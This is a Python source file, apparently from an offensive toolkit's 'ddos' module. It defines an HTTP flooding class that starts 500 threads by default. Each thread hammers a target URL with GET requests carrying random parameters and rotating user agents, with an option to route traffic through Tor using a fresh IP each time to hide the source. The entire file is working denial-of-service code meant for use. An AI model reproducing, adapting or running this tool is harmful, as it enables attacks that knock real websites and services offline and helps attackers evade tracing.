from bane.ddos.utils import *

class http_waves(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        method=3,
        threads_daemon=True,
        paths=["/"],
        threads=500,
        post_min=5,
        post_max=10,
        post_field_max=100,
        post_field_min=50,
        timeout=5,
        round_min=1000,
        round_max=10000,
        interval=0.001,
        duration=60,
        logs=False,
        tor=False,
    ):
        self.logs = logs
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.method = method
        self.stop = False
        self.counter = 0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.interval = interval
        self.round_min = round_min
        self.round_max = round_max
        self.paths = paths
        self.post_min = post_min
        self.post_max = post_max
        self.post_field_max = post_field_max
        self.post_field_min = post_field_min
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    data={}
                    files={}
                    files_count=random.randint(0,2)
                    
                    params_count=random.randint(0,5)
                    for x in range(params_count):
                        key_len=random.randint(0,15)
                        key=''.join([random.choice(lis) for x in range(key_len)])
                        val_len=random.randint(0,100)
                        val=''.join([random.choice(lis) for x in range(val_len)])
                        data.update({key:val})
                    if self.tor==True:
                        proxy=get_tor_socks5_proxy(new_ip=True)
                    else:
                        proxy=None
                    requests.get(self.target,params=data,proxies=proxy,timeout=self.timeout,verify=False,headers={'User-Agent':random.choice(ua)})
                    self.counter+=1
                except Exception as ex:
                    pass
                time.sleep(0.1)
            self.kill()
        except:
            pass